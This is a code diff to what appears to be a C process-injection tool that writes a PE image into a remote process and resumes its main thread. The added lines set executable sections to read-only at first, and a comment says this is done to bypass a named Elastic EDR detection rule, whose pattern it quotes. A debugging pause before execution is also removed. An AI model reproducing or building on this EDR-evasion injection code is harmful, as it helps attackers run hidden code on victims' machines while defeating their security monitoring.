@@ -51,7 +51,19 @@ BOOL FixMem(HANDLE hProcess, ULONG_PTR pPeBaseAddr, PIMAGE_NT_HEADERS pNtHdrs, P
 		}
 		if ((pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_READ)) {
 			MemProtect = PAGE_EXECUTE_READ;
-			DEBUG_PRINT("\t> PAGE_EXECUTE_READ\n");
+			/*-----------------------------------------------------
+				Make RX memory initially RO in an attempt to
+				bypass elastic EDR rule:
+				remote_process_manipulation_by_suspicious_process
+				L52: (process.Ext.api.parameters.protection : "*X*" and process.Ext.api.parameters.protection_old : "*W*")
+			-----------------------------------------------------*/
+			DEBUG_PRINT("\t> PAGE_EXECUTE_READ, marking it initially as PAGE_READONLY\n");
+			secSize = pSectHdrs[i].SizeOfRawData;
+			secAddr = (pPeBaseAddr + pSectHdrs[i].VirtualAddress);
+			status = NtAPIs.pNtProtectVirtualMemory(hProcess, &secAddr, &secSize, PAGE_READONLY, &old);
+			if (status != 0x00) {
+				DEBUG_PRINT("\t\t> failed making executable memory as read only\n");
+			}
 		}
 		if (
 			(pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
@@ -253,10 +265,12 @@ BOOL PreparePE(PROCESS_INFORMATION procInfo, PEHDRS PeHdrs) {
 		return FALSE;
 	}
 
+
     //Fix the memory permissions of the PE's sections
 	if (!FixMem(procInfo.hProcess, peAddr, PeHdrs.pNtHeaders, PeHdrs.pSectHeader)) {
 		return FALSE;
 	}
+	
 	return TRUE;
 }
 
@@ -268,7 +282,7 @@ BOOL ExecPE(PROCESS_INFORMATION procInfo, HANDLE stdOutRead) {
 
 	DEBUG_PRINT("[*] Executing the PE\n");
 	NTSTATUS status = NULL;
-	getchar();
+
 	DEBUG_PRINT("\t> resuming the remote process's main thread\n");
 	status = NtAPIs.pNtResumeThread(procInfo.hThread, NULL);
 	if (status != 0x00) {
@@ -305,3 +319,4 @@ BOOL ExecPE(PROCESS_INFORMATION procInfo, HANDLE stdOutRead) {
 	} while (state);
 	return TRUE;
 }
+
